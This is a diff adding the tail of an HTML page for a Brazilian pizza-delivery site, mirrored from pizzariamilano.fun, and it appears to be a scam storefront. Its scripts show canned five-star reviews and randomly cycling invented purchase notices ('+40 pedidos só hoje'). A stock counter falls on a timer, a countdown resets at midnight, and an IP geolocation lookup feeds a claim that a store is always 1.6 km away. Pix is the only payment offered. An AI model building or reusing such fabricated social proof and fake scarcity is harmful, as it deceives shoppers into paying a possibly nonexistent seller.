+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r7.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Julia R*****</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Massa leve e recheio sem
+									miséria. Muito boa mesmo.</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r8.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Glacia A*****</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Fui conhecer a famosa Padaria
+									do Chico! O lugar é super aconchegante, o atendimento é 10 e tudo que comi tava
+									surreal. Virei cliente!</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r9.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Herreira F******</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">O pancho da Padaria do Chico é
+									o melhor muito queijo e pão fofinho sem comparação</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r10.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Kaue T****</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">vocês zeraram a vida! Pão de
+									queijo fofinho e LOTADO de Nutella e acompanhado com uma coquinha kakaksakk</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r11.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Ana P****</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Veio quentinho, com o queijo
+									derretendo assim mesmo. Massa saborosa e muito recheio. Amei!</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r12.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+
+
+						<!-- Modal da Imagem -->
+						<div id="modalImagem"
+							style="display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); justify-content: center; align-items: center;">
+							<img id="imagemExpandida" style="max-width: 90%; max-height: 90%; border-radius: 10px;">
+						</div>
+
+						<script>
+							// Atualiza a data em todas as avaliações automaticamente
+							function formatarDataHoje() {
+								let hoje = new Date();
+								let dia = String(hoje.getDate()).padStart(2, '0');
+								let mes = String(hoje.getMonth() + 1).padStart(2, '0'); // Janeiro é 0!
+								let ano = hoje.getFullYear();
+								return `${dia}/${mes}/${ano}`;
+							}
+
+							document.querySelectorAll('.data-atual').forEach(el => {
+								el.innerText = formatarDataHoje();
+							});
+
+							// Função para expandir a imagem
+							function expandirImagem(img) {
+								let modal = document.getElementById("modalImagem");
+								let imagemExpandida = document.getElementById("imagemExpandida");
+								imagemExpandida.src = img.src;
+								modal.style.display = "flex";
+
+								// Fecha ao clicar fora da imagem
+								modal.onclick = function () {
+									modal.style.display = "none";
+								}
+							}
+						</script>
+						<div class="alert alert-success" style="color: red;outline: 2px solid red; background-color: rgb(255, 217, 217);
+						padding: 20px 10px;">
+							<b>A promoção vai acabar em:</b>
+							<div class="countdown">
+								<!-- <div class="box">
+								<span id="days">00</span>
+								<p>Dias</p>
+								</div>
+								<div class="box">
+								<span id="hours">00</span>
+								<p>Horas</p>
+								</div> -->
+								<div class="box">
+									<span id="minutes">00</span>
+									<p>Minutos</p>
+								</div>
+								<div class="box">
+									<span id="seconds">00</span>
+									<p>Segundos</p>
+								</div>
+							</div>
+							<a href="#pague-1-leve-2" style="background-color: white; border-radius: 8px;
+						padding: 4px 10px; color:#000000">Clique Para Ver Pizzas em Promoção 🖤</a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</main>
+		<div id="produto"></div>
+		<div id="info">
+			<a class="fechar" href="#fechar"><i class="far fa-times-circle fa-2x"></i></a>
+			<h2>Tipos de Entrega</h2>
+			<i class="fa-solid fa-motorcycle"></i> Entrega Motoboy<br>
+			<i class="fa-solid fa-box"></i> Retirada<br>
+			<br>
+			<h2>Formas de Pagamento</h2>
+			<i class="fa-regular fa-circle-check"></i> Pix<br>
+			<br>
+			<h2>Endereço</h2>
+			<span id="localCidade">cidade</span> - <span id="localEstado">UF</span><br>
+			<br>
+			<h2>Áreas de Entrega</h2>
+			<h3><span id="localCidade">cidade</span> - <span id="localEstado">UF</span></h3>
+			GRÁTIS (hoje)<br>
+			<br>
+		</div>
+	</div>
+	<script src="js/jquery.min.js"></script>
+	<script type="text/javascript" src="js/delivry.js"></script>
+	<script type="text/javascript">
+
+		$('.mostrarHorario').on('click', function () {
+			$('.horarios').toggle('slow');
+		});
+
+	</script>
+
+	<script type="text/javascript">
+		function updateCountdown() {
+			const now = new Date();
+			const nextMidnight = new Date();
+			nextMidnight.setHours(24, 0, 0, 0); // Próxima meia-noite
+
+			const diff = nextMidnight - now;
+
+			const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+			const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+			const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+			const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+			// document.getElementById("days").textContent = String(days).padStart(2, "0");
+			// document.getElementById("hours").textContent = String(hours).padStart(2, "0");
+			// document.getElementById("minutes").textContent = String(minutes).padStart(2, "0");
+			// document.getElementById("seconds").textContent = String(seconds).padStart(2, "0");
+
+			document.querySelectorAll("#minutes").forEach(el => el.textContent = String(minutes).padStart(2, "0"));
+			document.querySelectorAll("#seconds").forEach(el => el.textContent = String(seconds).padStart(2, "0"));
+		}
+
+		// Atualiza o contador a cada segundo
+		setInterval(updateCountdown, 1000);
+
+		// Inicializa o contador
+		updateCountdown();
+	</script>
+
+	<script src="js/all.js" data-auto-replace-svg="nest" defer="" type="text/javascript"></script>
+
+	<script src="js/sweetalert.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+	<script>
+
+		function escolherFraseAleatoria() {
+			const frases = [
+				"🎉 <b>Lucas</b> acabou de comprar o Combo Nonatto's + refirgerante!",
+				"🚀 <b>Ana</b> garantiu o Combo Nonatto Familia + Refrigerante há 2 minutos!",
+				"🎉 <b>Rafaela</b> finalizou a compra do Combo Individual agora!",
+				"🔥 <b>Fernando</b> comprou o Combo Casal há poucos instantes!",
+				"😋 <b>Isabela</b> adicionou um Combo Casal ao carrinho!",
+				"⏳ <b>Bruno</b> comprou o Combo 3! Restam poucas unidades!",
+				"📦 <b>João</b> pediu 2 Combos de Pizza agora mesmo!",
+				"🏆 <b>Mirella</b> garantiu o Combo Mais Vendido – Combo Casal Nonatto!",
+				"🚨 <b>Atenção</b>! Mais de <b>15 pedidos</b> nos últimos 10 minutos!",
+				"🔥 Nas últimas 2 horas, 37 pessoas compraram nossos combos!",
+				"⚡ Acabamos de bater 100 pedidos de Pizza só hoje!",
+				"⏳ Apenas 4 unidades do Combo 3 restantes! Corra antes que acabe!",
+				"🚀 +20 pedidos feitos nos últimos 30 minutos! Nonatto bombando!",
+				"⏳ Os combos estão esgotando rápido! Aproveite agora!",
+				"🎯 Mais de 250 clientes satisfeitos nos últimos 7 dias!",
+				"🔥 Obrigado! Mais de 500 pedidos já saíram esse mês!",
+				"🚀 Só hoje, 73 clientes garantiram seu combo de Pizza!",
+				"⏳ O estoque do Combo 3 está quase esgotando! Últimas unidades!",
+				"🎉 Promoção fazendo sucesso! +40 pedidos só hoje!"
+			];
+
+			const indiceAleatorio = Math.floor(Math.random() * frases.length);
+			return frases[indiceAleatorio];
+		}
+
+		function mostrarNotificacao(frase) {
+			if (!Swal.isVisible()) {
+				const Toast = Swal.mixin({
+					toast: true,
+					position: "bottom-end",
+					showConfirmButton: false,
+					timer: 6500,
+					timerProgressBar: true,
+				});
+				Toast.fire({
+					icon: "success",
+					title: frase
+				});
+			}
+		}
+
+		setInterval(() => {
+			const fraseAleatoria = escolherFraseAleatoria();
+			mostrarNotificacao(fraseAleatoria);
+		}, 25000);
+	</script>
+
+	<script>
+		function diminuirEstoque() {
+			document.querySelectorAll("#estoqueCombo").forEach(elemento => {
+				let estoqueAtual = parseInt(elemento.textContent, 10);
+				if (estoqueAtual > 1) {
+					elemento.textContent = estoqueAtual - 1;
+				}
+			});
+		}
+
+		// Executa a função a cada 15 segundos
+		setInterval(diminuirEstoque, 15000);
+	</script>
+
+	<script>
+		function setCookie(name, value, days) {
+			let expires = new Date(Date.now() + days * 864e5).toUTCString();
+			document.cookie = `${name}=${value}; expires=${expires}; path=/`;
+		}
+
+		function getCookie(name) {
+			return document.cookie.split('; ').reduce((acc, cookie) => {
+				let [key, val] = cookie.split('=');
+				return key === name ? val : acc;
+			}, "");
+		}
+
+		function checkCookie(nome) {
+			return getCookie(nome) !== "";
+		}
+
+		async function fetchLocation() {
+			try {
+				let response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+				let { city = "Local Desconhecido", region = "Local Desconhecido" } = await response.json();
+				return { city, region };
+			} catch (error) {
+				console.error('Erro ao obter a localização:', error);
+				return { city: "Local Desconhecido", region: "Local Desconhecido" };
+			}
+		}
+
+		const estados = {
+			"Rio Grande do Sul": "RS"
+		};
+
+		const estados_input = {
+			RS: "Rio Grande do Sul",
+		}
+
+		const cidades_por_estados = [
+			["RS", "Viamão"],
+		]
+
+		async function atualizarLocalizacao() {
+			let cidade = getCookie("localCidade");
+			let estado = getCookie("localEstado");
+
+			if (!cidade || !estado) {
+				({ city: cidade, region: estado } = await fetchLocation());
+			}
+
+			document.querySelectorAll("#localCidade").forEach(el => el.textContent = cidade);
+			document.querySelectorAll("#localEstado").forEach(el => el.textContent = estado);
+		}
+
+		async function escolherLocalizacao() {
+
+			await atualizarLocalizacao();
+
+			if (checkCookie("localCidade") && checkCookie("localEstado")) {
+				return;
+			}
+
+			let buscarLocalizacao = (await fetchLocation());
+			let estado = buscarLocalizacao.region;
+			let cidadeTemp = buscarLocalizacao.city;
+			let uf = estados[estado] || "";
+
+			let { value: estadoEscolhido } = await Swal.fire({
+				title: "Procure a loja mais próxima de você!",
+				text: "Escolha seu estado:",
+				input: "select",
+				inputOptions: estados_input,
+				inputPlaceholder: "Escolha seu estado",
+				inputValue: uf,
+				confirmButtonText: "Próximo",
+				confirmButtonColor: "green",
+				allowOutsideClick: false,
+				allowEscapeKey: false,
+				inputValidator: value => value ? undefined : "Por favor, escolha seu estado."
+			});
+
+			setCookie("localEstado", estadoEscolhido, 365);
+
+			var quais_opt_de_cidade = []
+
+			cidades_por_estados.forEach((item, index) => {
+				if (item[0] == estadoEscolhido) {
+					quais_opt_de_cidade.push(item[1])
+				}
+			});
+
+			let { value: cidadeEscolhida } = await Swal.fire({
+				title: "Estamos quase lá...",
+				text: "Agora, selecione sua cidade:",
+				input: "select",
+				inputOptions: quais_opt_de_cidade,
+				inputValue: quais_opt_de_cidade.indexOf(cidadeTemp),
+				confirmButtonText: "Procurar loja mais próxima!",
+				confirmButtonColor: "green",
+				allowOutsideClick: false,
+				allowEscapeKey: false,
+				inputValidator: value => value ? undefined : "Por favor, escolha sua cidade."
+			});
+
+			cidadeEscolhida = quais_opt_de_cidade[cidadeEscolhida];
+
+			setCookie("localCidade", cidadeEscolhida, 365);
+
+			Swal.fire({
+				title: "Procurando a loja mais próxima...",
+				html: `Procurando a loja mais próxima de você em <b>${cidadeEscolhida}</b>...`,
+				timer: 1000,
+				timerProgressBar: true,
+				allowOutsideClick: false,
+				didOpen: () => Swal.showLoading(),
+			}).then(() => {
+				Swal.fire({
+					html: `A loja mais próxima fica a <b>1,6km</b> de você! Seu pedido chegará entre 30 a 50 minutos.`,
+					icon: "success",
+					confirmButtonText: "Olhar cardápio de ofertas!",
+					confirmButtonColor: "green",
+					allowOutsideClick: false,
+				}).then(atualizarLocalizacao);
+			});
+		}
+
+		escolherLocalizacao();
+	</script>
+
+	<script>
+		document.querySelectorAll('.add-to-cart').forEach(btn => {
+			btn.addEventListener('click', (e) => {
+				e.stopPropagation(); // impede o clique de “subir” pro <a>
+				e.preventDefault(); // evita recarregar página
+			});
+		});
+	</script>
+
+</body>
+<!-- Mirrored from pizzariamilano.fun/n1/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Apr 2025 23:24:50 GMT -->
+
+</html>
